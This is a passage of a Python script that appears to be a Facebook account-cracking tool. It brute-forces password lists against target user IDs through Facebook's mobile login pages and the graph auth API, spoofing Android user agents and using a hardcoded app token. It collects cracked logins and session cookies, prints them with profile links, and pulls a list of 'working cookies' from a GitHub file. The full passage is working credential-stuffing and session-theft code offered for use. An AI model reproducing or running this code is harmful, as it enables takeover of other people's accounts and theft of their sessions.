S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890']
            fbks=['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite']
            fbs=rc(fbks)
            application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
            application_version_code=str(random.randint(000000000,999999999))
            gtt=random.choice(xxxxx)
            gttt=random.choice(xxxxx)
            android_version=str(random.randrange(6,10))
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            data = {"adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {'User-Agent': ua_string,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'x-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url1= 'https://b-graph.facebook.com/auth/login'
            po = session.post(url=url1,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if "session_key" in q:
                print(f"\r\r \033[38;5;46m[B0B-OK] {uid} <> {ps}")
                oks.append(uid)
                break
            elif "www.facebook.com" in q['error']['message']:
                print(f"\r\r\033[2;97m[B0B-CP] {uid} <> {ps} \x1b[0m")
                cps.append(uid)
                break
            else: continue
        loop+=1
    except:print("work")
    

def programmer_heron(uid,pwx,tl,fb,pr,fb1):
    global loop,oks
    animison=rc(["\033[1;90m","\x1b[38;5;208m"])
    if animison =="\x1b[38;5;208m":
        animison2="\033[1;90m"
    else:
        animison2="\x1b[38;5;208m"
    if fb in ["auto"]:
        fb=rc(mathod)
    sys.stdout.write(f"\r [B0B-XD] {loop}|{str(len(oks))}|{fb1} \r");sys.stdout.flush()
    
    ct=str(datetime.now())
    pros=ct.split(" ")[1]
    jf=pros.split(".")[0]
    rt=jf.split(":")[0]
    rt2=jf.split(":")[1]
    if int(rt) > 12:
        xt=int(rt)-12
        ct=str(xt)+":"+rt2
        no="PM"
    else:
        ct=rt+":"+rt2
        no="AM"
    session=requests.Session()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    window=rc(heron) 
    uuu=rc([window,ua,ua2])
    try:
        for ps in pwx:
            free_fb = session.get(f'https://{fb}.facebook.com').text
            info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            update= {      
        'authority': f'{fb}.facebook.com',
        'method': 'GET',
        'scheme': 'https',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;        q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'referer': f'https://{fb}.facebook.com/',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
        'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Linux"',
        'sec-ch-ua-platform-version': '""',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': uuu,}
            session.post(url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update).text
            heron_brand=session.cookies.get_dict().keys()
            if 'c_user' in heron_brand:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1=coki.split("1000")[1]
                xd= "1000"+coki1[0:11]
                ua=rc(ugen)
                hd={'authority':'m.facebook.com',
                'method': 'GET',
                'user-agent':ua,}
                try:
                    t=requests.get(f"https://m.facebook.com/profile.php?id={xd}",headers=hd)
                    data=mahi(t.content,"html.parser")
                    name=data.find("title").text
                    clean=name.split("|") [0]
                    if "Log in to Facebook" in clean:
                        us_nam="Death-User"
                    else:
                        us_nam=clean
                except:
                    us_nam="Net-Error"
                if xd in oks:
                    pass
                else:
                    oks.append(xd)
                    sort=coki.split("sb=")[1]
                    print("\r\r\033[38;5;46m\033[38;5;46m\033[47m\033[38;5;196mGANJAS\x1b[0m \033[38;5;46m=[🔷]= \033[38;5;46m"+xd+" |\033[38;5;46m "+ps+"  \033[7;93m"+tahunng(xd)+"\x1b[0m \033[3;90m"+ct+" \033[2;97m"+no+"\x1b[0m\n\033[38;5;46m=[🔶]= \033[1;31m\033[1;47m\033[38;5;196mCOOKIE\033[00m \033[38;5;46msb="+sort+"\n[Id-Name] [ "+us_nam+" ] • [Login-In] [https://"+fb+".facebook.com]\n\033[2;97mhttps://www.facebook.com/profile.php?id="+xd+"\033[00m\n\033[1;90m———————————————————\033[1;97m———————————————————\x1b[0m")
                    dual(f"supprise",'.audio.mp3')
                    time.sleep(1)
                    break
            elif 'checkpoint' in heron_brand:
                _DEVIL_(f"espeak \"{str(len(cdoen))} I.D , CRACK\"")
                break
            else:
                continue
        loop+=1
        cdoen.append(uid)
    except:
        time.sleep(20.0)
        pass





def auto_coki():
    cookes=requests.get("https://raw.githubusercontent.com/B0B-MARLEY/database/main/c_data.txt").text
    o=open(".o.txt","w").write(cookes)
    cooke_store=open(".o.txt","r").read().splitlines()
    clear()
    print(logo)
    print(" \033[38;5;196m[✓] 100% WORKING COOKIES ");line()
    
    print(f"\033[47m\033[38;5;196m[✓] COOKIES\x1b[0m  "+rc(c2)+rc(cooke_store));line()
    dual("use cookies only for file make",'.audio.mp3')
    
    dh=input(" \033[38;5;196mDO YOU WANT MORE COOKIES [Y/n]")
    if dh in ["y","Y","yes","Yes"]:
        auto_coki()

#+++++++++++++++++++++#
menu()